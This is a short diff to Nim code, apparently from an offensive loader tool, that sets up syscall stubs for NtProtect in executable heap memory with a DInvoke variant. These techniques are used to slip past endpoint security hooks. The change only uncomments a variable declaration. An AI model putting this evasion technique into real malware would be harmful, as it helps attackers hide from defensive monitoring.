@@ -299,6 +299,7 @@ let RetrieveSyscallStubs * = """
 
 
     var hProcess: HANDLE
+    
     when defined(DInvoke):
         hProcess = -1
 
@@ -313,7 +314,7 @@ let RetrieveSyscallStubs * = """
     else:
         hProcess = -1
         var pHandle2: HANDLE = -1
-        #var syscallStub_NtProtect: LPVOID
+        var syscallStub_NtProtect: LPVOID
         #syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
         var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
         syscallStub_NtProtect = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)
